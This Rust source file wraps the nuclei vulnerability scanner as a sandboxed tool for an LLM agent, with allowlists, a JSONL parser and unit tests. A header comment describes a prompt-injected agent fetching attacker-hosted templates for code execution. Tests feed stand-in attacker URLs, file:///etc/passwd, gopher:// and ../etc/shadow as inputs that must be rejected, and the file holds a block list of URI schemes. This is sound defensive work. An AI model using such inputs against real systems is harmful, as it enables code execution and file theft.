//! NucleiTool — sandboxed nuclei wrapper for template-based vulnerability scanning.
//!
//! @decision DEC-TOOL-007
//! @title NucleiTool uses SandboxProfile::web_scanner() for pasta networking
//! @status accepted
//! @rationale nuclei runs community-authored YAML templates against a target,
//! covering CVEs, misconfigurations, exposed panels, and more. Scans can be
//! broad (all templates) or targeted (specific template path or severity filter).
//! SandboxProfile::WebScanner provides a 600s timeout for broad template runs.
//! The `-silent -nc -jsonl` flags suppress banners and ANSI colour codes and
//! emit one JSON object per finding line, keeping stdout machine-readable for
//! LLM consumption. `parse_nuclei_jsonl()` parses each JSONL line into a
//! structured summary (findings list, total count, by_severity counts) which
//! is stored in `structured_data`. Raw JSONL is preserved in `stdout` for
//! direct LLM reading. Severity filtering lets the agent focus on actionable
//! findings and avoid low-noise informational output.
//!
//! @decision DEC-TOOL-NUCLEI-002
//! @title Allowlist template prefixes and system paths; reject URLs and arbitrary paths
//! @status accepted
//! @rationale Finding #5 from the /cso security audit (HIGH, 8/10 confidence):
//! nuclei's `-t` flag accepts HTTP/HTTPS URLs and arbitrary file paths. nuclei
//! templates are Go templates with HTTP request execution and code post-processing
//! helpers. An LLM (or prompt-injected agent) passing `templates=https://attacker.com/
//! c2.yaml` causes nuclei to fetch and execute attacker-authored Go templates inside
//! the SIGINT sandbox — effectively RCE-in-sandbox. The fix is a static allowlist of
//! known-safe template category prefixes (nuclei built-in categories) plus permitted
//! absolute paths (system-installed template directories). URLs are explicitly blocked
//! as the primary RCE vector. Arbitrary local paths outside the allowed system dirs
//! are also blocked (e.g. /etc/passwd, ../etc/shadow). The target argument is also
//! validated: nuclei accepts `gopher://`, `file://`, and other non-HTTP schemes that
//! have no legitimate use in an HTTP scanner; only http://, https://, bare
//! hostnames, IPs, and CIDRs are permitted. Unlike the recon SSRF guard, nuclei is
//! allowed to scan localhost targets because operators legitimately scan their own
//! dev servers — the recon-side SSRF defence is separate.

use std::collections::HashMap;

use async_trait::async_trait;
use serde_json::{json, Value};
use sigint_llm::ToolDefinition;
use sigint_sandbox::profile::SandboxProfile;
use tracing::info;

use crate::error::{Result, ToolError};
use crate::result::{ToolResult, TruncationInfo};
use crate::tool::Tool;
use sigint_core::types::ToolRisk;

/// Severity levels accepted by nuclei's `-severity` flag.
const VALID_SEVERITIES: &[&str] = &["info", "low", "medium", "high", "critical"];

/// Allowed template category prefixes (nuclei built-in template directories).
///
/// These correspond to the top-level directories in the official
/// nuclei-templates repository. Any value passed as `templates` must start
/// with one of these prefixes (relative form) or with an entry in
/// `ALLOWED_TEMPLATE_PATH_PREFIXES` (absolute system path form).
const ALLOWED_TEMPLATE_PREFIXES: &[&str] = &[
    "cves/",
    "exposures/",
    "exposed-panels/",
    "vulnerabilities/",
    "misconfiguration/",
    "default-logins/",
    "takeovers/",
    "technologies/",
    "dns/",
    "ssl/",
    "http/",
    "network/",
    "headless/",
    "code/",
    "javascript/",
];

/// Allowed absolute path prefixes for system-installed nuclei templates.
///
/// Only paths under these roots are permitted as absolute template paths.
/// This covers common Linux package manager install locations.
const ALLOWED_TEMPLATE_PATH_PREFIXES: &[&str] =
    &["/usr/share/nuclei-templates/", "/opt/nuclei-templates/"];

/// Validate a nuclei template argument.
///
/// Rejects:
/// - HTTP/HTTPS URLs (primary RCE vector — attacker-hosted templates)
/// - Absolute paths outside `ALLOWED_TEMPLATE_PATH_PREFIXES`
/// - Relative paths not matching a known category prefix
///
/// Returns `Ok(())` if the template is in the allowlist.
fn validate_template(t: &str) -> Result<()> {
    // Reject URLs explicitly — nuclei accepts http/https URLs and that is the
    // primary RCE vector (attacker-hosted templates, Finding #5).
    if t.starts_with("http://") || t.starts_with("https://") {
        return Err(ToolError::DisallowedArgument(format!(
            "nuclei template URL not permitted: {} — \
             only local template categories (e.g. cves/, exposures/) and \
             system paths (/usr/share/nuclei-templates/) are allowed",
            t
        )));
    }

    // Allowlist: relative category prefix OR absolute system path.
    if ALLOWED_TEMPLATE_PREFIXES.iter().any(|p| t.starts_with(p))
        || ALLOWED_TEMPLATE_PATH_PREFIXES
            .iter()
            .any(|p| t.starts_with(p))
    {
        return Ok(());
    }

    Err(ToolError::DisallowedArgument(format!(
        "nuclei template '{}' not in allowlist (categories: {}; system paths: {})",
        t,
        ALLOWED_TEMPLATE_PREFIXES.join(", "),
        ALLOWED_TEMPLATE_PATH_PREFIXES.join(", "),
    )))
}

/// Validate a nuclei target argument for dangerous URI schemes.
///
/// Nuclei accepts `file://`, `gopher://`, and other non-HTTP schemes that have
/// no legitimate use in an HTTP vulnerability scanner. An LLM passing
/// `target=file:///etc/passwd` is suspicious and should fail loudly.
///
/// Unlike the recon SSRF guard, we allow `http://localhost` and similar local
/// targets — operators legitimately scan their own dev servers via nuclei.
/// Scheme validation (not host validation) is the right boundary here.
fn validate_nuclei_target(t: &str) -> Result<()> {
    // Reject non-HTTP/HTTPS schemes — these have no legitimate use in an HTTP scanner.
    const DANGEROUS_SCHEMES: &[&str] = &[
        "file://",
        "gopher://",
        "ftp://",
        "ldap://",
        "ldaps://",
        "dict://",
        "sftp://",
        "tftp://",
        "smtp://",
        "imap://",
        "pop3://",
    ];

    for scheme in DANGEROUS_SCHEMES {
        if t.starts_with(scheme) {
            return Err(ToolError::DisallowedArgument(format!(
                "nuclei target scheme '{}' not permitted — \
                 only http://, https://, bare hostnames, IPs, and CIDRs are accepted",
                scheme
            )));
        }
    }

    Ok(())
}

/// Default 1 MB output cap for nuclei.
const DEFAULT_NUCLEI_OUTPUT_CAP: usize = 1_048_576;

/// Sandboxed nuclei tool wrapper.
///
/// Exposes nuclei as a `Tool` for the LLM agent layer. Runs YAML-based
/// vulnerability templates against a URL target. Network access is provided via
/// pasta user-mode networking with a 10-minute timeout.
pub struct NucleiTool {
    output_cap: usize,
}

impl NucleiTool {
    /// Create a new NucleiTool with the default output cap.
    pub fn new() -> Self {
        Self {
            output_cap: DEFAULT_NUCLEI_OUTPUT_CAP,
        }
    }

    /// Set a custom output cap (builder pattern).
    pub fn with_output_cap(mut self, cap: usize) -> Self {
        self.output_cap = cap;
        self
    }
}

impl Default for NucleiTool {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Tool for NucleiTool {
    fn name(&self) -> &str {
        "nuclei_scan"
    }

    fn description(&self) -> &str {
        "Run nuclei template-based vulnerability scanner against a target URL. \
         Returns matched findings from community templates covering CVEs, \
         misconfigurations, and exposed panels. Requires network access — runs \
         inside a sandboxed environment with pasta user-mode networking."
    }

    fn risk_level(&self) -> ToolRisk {
        ToolRisk::Medium
    }

    fn definition(&self) -> ToolDefinition {
        ToolDefinition::function(
            self.name(),
            self.description(),
            json!({
                "type": "object",
                "properties": {
                    "target": {
                        "type": "string",
                        "description": "Target URL to scan (e.g. 'http://example.com')."
                    },
                    "templates": {
                        "type": "string",
                        "description": "Template path or tag to run (e.g. 'cves/2021/CVE-2021-44228', \
                                        'exposures', '/path/to/custom.yaml'). Omit to run all default templates."
                    },
                    "severity": {
                        "type": "string",
                        "enum": ["info", "low", "medium", "high", "critical"],
                        "description": "Filter findings by minimum severity. Omit to return all severities."
                    }
                },
                "required": ["target"]
            }),
        )
    }

    async fn execute(&self, args: Value) -> Result<ToolResult> {
        // Extract required target.
        let target = args["target"]
            .as_str()
            .ok_or_else(|| ToolError::MissingArgument("target".to_string()))?
            .to_string();

        // Validate target scheme — reject file://, gopher://, etc. (Finding #5).
        validate_nuclei_target(&target)?;

        // Extract optional templates path/tag.
        let templates = args["templates"].as_str().map(|s| s.to_string());

        // Validate template against the allowlist before passing to nuclei (Finding #5).
        if let Some(ref t) = templates {
            validate_template(t)?;
        }

        // Extract optional severity filter; validate against allowed values.
        let severity = match args["severity"].as_str() {
            None => None,
            Some(s) => {
                if VALID_SEVERITIES.contains(&s) {
                    Some(s.to_string())
                } else {
                    return Err(ToolError::InvalidArgument {
                        name: "severity".to_string(),
                        expected: "one of: info, low, medium, high, critical".to_string(),
                    });
                }
            }
        };

        info!(
            target = %target,
            templates = ?templates,
            severity = ?severity,
            "executing nuclei scan"
        );

        let mut cmd = SandboxProfile::web_scanner().apply("nuclei");
        cmd = cmd.max_output(self.output_cap);
        cmd = cmd.arg("-u").arg(&target);

        // Suppress banner and ANSI colour codes; emit one JSON object per finding.
        cmd = cmd.arg("-silent");
        cmd = cmd.arg("-nc");
        cmd = cmd.arg("-jsonl");

        // Apply optional template filter.
        if let Some(ref t) = templates {
            cmd = cmd.arg("-t").arg(t);
        }

        // Apply optional severity filter.
        if let Some(ref s) = severity {
            cmd = cmd.arg("-severity").arg(s);
        }

        // SandboxedCommand::execute() is synchronous — bridge via spawn_blocking.
        let output = tokio::task::spawn_blocking(move || cmd.execute())
            .await
            .map_err(|e| ToolError::Sandbox(format!("spawn_blocking panicked: {e}")))?
            .map_err(|e| {
                let msg = e.to_string();
                if msg.contains("timed out") || msg.contains("timeout") {
                    ToolError::Timeout(600)
                } else {
                    ToolError::Sandbox(msg)
                }
            })?;

        let structured_data = parse_nuclei_jsonl(&output.stdout);

        let truncation = output.was_truncated.then_some(TruncationInfo {
            original_bytes: output.original_stdout_len,
            kept_bytes: output.stdout.len(),
        });
        Ok(ToolResult {
            stdout: output.stdout,
            stderr: output.stderr,
            exit_code: output.exit_code,
            duration: output.duration,
            structured_data,
            status: Default::default(),
            truncation,
        })
    }
}

/// Parse nuclei JSONL output into a structured summary.
///
/// Each line of nuclei `-jsonl` output is a self-contained JSON object. This
/// function collects valid lines into a findings list and builds summary
/// aggregations (total count, per-severity counts). Malformed lines are
/// silently skipped. Returns `None` if there are no valid findings at all.
///
/// Output shape:
/// ```json
/// {
///   "findings": [
///     {"template_id": "...", "name": "...", "severity": "...", "matched_at": "...", "type": "..."}
///   ],
///   "total": 1,
///   "by_severity": {"critical": 1}
/// }
/// ```
fn parse_nuclei_jsonl(output: &str) -> Option<Value> {
    let mut findings: Vec<Value> = Vec::new();
    let mut by_severity: HashMap<String, u64> = HashMap::new();

    for line in output.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }

        // Parse the line as JSON; skip on any error.
        let obj: Value = match serde_json::from_str(line) {
            Ok(v) => v,
            Err(_) => continue,
        };

        // Extract required fields; skip the line if any are missing.
        let template_id = match obj["template-id"].as_str() {
            Some(s) => s.to_string(),
            None => continue,
        };
        let name = match obj["info"]["name"].as_str() {
            Some(s) => s.to_string(),
            None => continue,
        };
        let severity = match obj["info"]["severity"].as_str() {
            Some(s) => s.to_string(),
            None => continue,
        };
        let matched_at = match obj["matched-at"].as_str() {
            Some(s) => s.to_string(),
            None => continue,
        };
        let finding_type = match obj["type"].as_str() {
            Some(s) => s.to_string(),
            None => continue,
        };

        // Accumulate severity counts.
        *by_severity.entry(severity.clone()).or_insert(0) += 1;

        findings.push(json!({
            "template_id": template_id,
            "name": name,
            "severity": severity,
            "matched_at": matched_at,
            "type": finding_type,
        }));
    }

    if findings.is_empty() {
        return None;
    }

    let total = findings.len() as u64;
    let by_severity_json: Value = by_severity
        .into_iter()
        .map(|(k, v)| (k, json!(v)))
        .collect();

    Some(json!({
        "findings": findings,
        "total": total,
        "by_severity": by_severity_json,
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn nuclei_risk_level_is_medium() {
        assert_eq!(
            NucleiTool::new().risk_level(),
            sigint_core::types::ToolRisk::Medium
        );
    }

    #[test]
    fn nuclei_tool_name_nonempty() {
        assert!(!NucleiTool::new().name().is_empty());
        assert_eq!(NucleiTool::new().name(), "nuclei_scan");
    }

    #[test]
    fn nuclei_tool_description_nonempty() {
        assert!(!NucleiTool::new().description().is_empty());
    }

    #[test]
    fn nuclei_tool_definition_shape() {
        let def = NucleiTool::new().definition();
        assert_eq!(def.type_, "function");
        assert_eq!(def.function.name, "nuclei_scan");

        let params = &def.function.parameters;
        assert_eq!(params["type"], "object");

        // target is required
        let required = params["required"].as_array().unwrap();
        assert!(
            required.iter().any(|v| v == "target"),
            "target should be required"
        );

        // target property exists and is a string
        assert_eq!(params["properties"]["target"]["type"], "string");

        // templates is optional (not in required array)
        assert!(params["properties"]["templates"].is_object());
        assert!(
            !required.iter().any(|v| v == "templates"),
            "templates should be optional"
        );

        // severity has enum constraint
        let severity_enum = params["properties"]["severity"]["enum"].as_array().unwrap();
        assert!(severity_enum.iter().any(|v| v == "info"));
        assert!(severity_enum.iter().any(|v| v == "critical"));
    }

    #[tokio::test]
    async fn nuclei_missing_target_errors() {
        let err = NucleiTool::new().execute(json!({})).await.unwrap_err();
        assert!(
            err.to_string().contains("missing required argument"),
            "unexpected error: {err}"
        );
    }

    #[tokio::test]
    async fn nuclei_invalid_severity_errors() {
        let err = NucleiTool::new()
            .execute(json!({"target": "http://example.com", "severity": "ultra"}))
            .await
            .unwrap_err();
        assert!(
            err.to_string().contains("invalid argument"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn nuclei_valid_severities_accepted() {
        for sev in VALID_SEVERITIES {
            // Just verify the constant matches the schema — execution tests are #[ignore]
            assert!(
                VALID_SEVERITIES.contains(sev),
                "severity '{}' should be valid",
                sev
            );
        }
    }

    #[test]
    fn parse_nuclei_jsonl_multiple_findings() {
        let input = r#"{"template-id":"cve-2021-44228","info":{"name":"Log4Shell","severity":"critical"},"matched-at":"http://example.com/api","type":"http"}
{"template-id":"cve-2022-1234","info":{"name":"SomeHigh","severity":"high"},"matched-at":"http://example.com/login","type":"http"}
{"template-id":"cve-2023-9999","info":{"name":"SomeMedium","severity":"medium"},"matched-at":"http://example.com/config","type":"http"}"#;

        let result = parse_nuclei_jsonl(input).expect("should parse findings");

        let findings = result["findings"]
            .as_array()
            .expect("findings should be array");
        assert_eq!(findings.len(), 3, "should have 3 findings");
        assert_eq!(result["total"], 3, "total should be 3");

        // Check severity counts
        assert_eq!(result["by_severity"]["critical"], 1);
        assert_eq!(result["by_severity"]["high"], 1);
        assert_eq!(result["by_severity"]["medium"], 1);

        // Check first finding field values
        let first = &findings[0];
        assert_eq!(first["template_id"], "cve-2021-44228");
        assert_eq!(first["name"], "Log4Shell");
        assert_eq!(first["severity"], "critical");
        assert_eq!(first["matched_at"], "http://example.com/api");
        assert_eq!(first["type"], "http");
    }

    #[test]
    fn parse_nuclei_jsonl_empty_output() {
        assert!(
            parse_nuclei_jsonl("").is_none(),
            "empty string should return None"
        );
    }

    #[test]
    fn parse_nuclei_jsonl_malformed_lines_skipped() {
        let input = r#"{"template-id":"cve-2021-44228","info":{"name":"Log4Shell","severity":"critical"},"matched-at":"http://example.com/api","type":"http"}
this is not json at all
{"broken": true
{"template-id":"cve-2022-5678","info":{"name":"Another","severity":"high"},"matched-at":"http://example.com/other","type":"dns"}"#;

        let result = parse_nuclei_jsonl(input).expect("should parse valid findings, skip invalid");
        let findings = result["findings"]
            .as_array()
            .expect("findings should be array");
        assert_eq!(
            findings.len(),
            2,
            "should have 2 valid findings, skipping malformed lines"
        );
        assert_eq!(result["total"], 2);
    }

    /// Requires nuclei + passt + newuidmap. Run with: cargo test -p sigint-tools -- --ignored
    #[tokio::test]
    #[ignore]
    async fn nuclei_executes_against_loopback() {
        let result = NucleiTool::new()
            .execute(json!({
                "target": "http://127.0.0.1",
                "severity": "medium"
            }))
            .await
            .expect("nuclei execution should not error");
        // nuclei exits 0 even when no templates match
        assert_eq!(
            result.exit_code, 0,
            "nuclei should exit 0: {:?}",
            result.stderr
        );
    }

    // ── Security allowlist tests (Finding #5) ─────────────────────────────────

    #[tokio::test]
    async fn template_url_rejected() {
        // An HTTPS URL is the primary RCE vector — attacker-hosted templates.
        let err = NucleiTool::new()
            .execute(
                json!({"target": "http://example.com", "templates": "https://attacker.com/x.yaml"}),
            )
            .await
            .unwrap_err();
        assert!(
            matches!(err, ToolError::DisallowedArgument(_)),
            "https:// template URL must be rejected with DisallowedArgument, got: {err}"
        );
    }

    #[tokio::test]
    async fn template_http_url_rejected() {
        let err = NucleiTool::new()
            .execute(
                json!({"target": "http://example.com", "templates": "http://evil.com/pwn.yaml"}),
            )
            .await
            .unwrap_err();
        assert!(
            matches!(err, ToolError::DisallowedArgument(_)),
            "http:// template URL must be rejected, got: {err}"
        );
    }

    #[test]
    fn template_category_allowed() {
        // Standard nuclei template category prefix — must be accepted.
        assert!(
            validate_template("cves/2021/CVE-2021-44228.yaml").is_ok(),
            "cves/ category must be allowed"
        );
        assert!(
            validate_template("exposures/configs/exposed-git-config.yaml").is_ok(),
            "exposures/ category must be allowed"
        );
        assert!(
            validate_template("http/cves/2023/CVE-2023-1234.yaml").is_ok(),
            "http/ category must be allowed"
        );
    }

    #[test]
    fn template_system_path_allowed() {
        // Absolute paths under system template roots must be accepted.
        assert!(
            validate_template("/usr/share/nuclei-templates/cves/2021/CVE-2021-44228.yaml").is_ok(),
            "/usr/share/nuclei-templates/ path must be allowed"
        );
        assert!(
            validate_template("/opt/nuclei-templates/http/exposures/test.yaml").is_ok(),
            "/opt/nuclei-templates/ path must be allowed"
        );
    }

    #[test]
    fn template_arbitrary_local_path_rejected() {
        // Absolute paths outside the allowed system dirs must be rejected.
        assert!(
            validate_template("/etc/passwd").is_err(),
            "/etc/passwd must be rejected"
        );
        assert!(
            validate_template("/home/user/evil.yaml").is_err(),
            "arbitrary home-dir path must be rejected"
        );
    }

    #[test]
    fn template_relative_path_rejected() {
        // Relative paths that don't match a category prefix must be rejected.
        assert!(
            validate_template("../etc/shadow").is_err(),
            "../etc/shadow (traversal) must be rejected"
        );
        assert!(
            validate_template("custom/my-template.yaml").is_err(),
            "unlisted category prefix must be rejected"
        );
    }

    #[tokio::test]
    async fn target_file_scheme_rejected() {
        // file:// scheme has no legitimate use in an HTTP scanner.
        let err = NucleiTool::new()
            .execute(json!({"target": "file:///etc/passwd"}))
            .await
            .unwrap_err();
        assert!(
            matches!(err, ToolError::DisallowedArgument(_)),
            "file:// target must be rejected with DisallowedArgument, got: {err}"
        );
    }

    #[tokio::test]
    async fn target_gopher_scheme_rejected() {
        let err = NucleiTool::new()
            .execute(json!({"target": "gopher://internal/ssrf"}))
            .await
            .unwrap_err();
        assert!(
            matches!(err, ToolError::DisallowedArgument(_)),
            "gopher:// target must be rejected, got: {err}"
        );
    }

    #[test]
    fn target_http_allowed() {
        // http://localhost is valid — nuclei is allowed to scan local dev servers.
        // (The recon SSRF guard is separate; nuclei doesn't apply host checks.)
        assert!(
            validate_nuclei_target("http://localhost").is_ok(),
            "http://localhost must be allowed for nuclei"
        );
        assert!(
            validate_nuclei_target("http://example.com").is_ok(),
            "http://example.com must be allowed"
        );
        assert!(
            validate_nuclei_target("https://example.com").is_ok(),
            "https:// must be allowed as a target scheme"
        );
    }

    #[test]
    fn target_bare_hostname_allowed() {
        assert!(
            validate_nuclei_target("example.com").is_ok(),
            "bare hostname must be allowed"
        );
        assert!(
            validate_nuclei_target("192.168.1.1").is_ok(),
            "bare IP (no scheme) must be allowed for nuclei target"
        );
    }
}
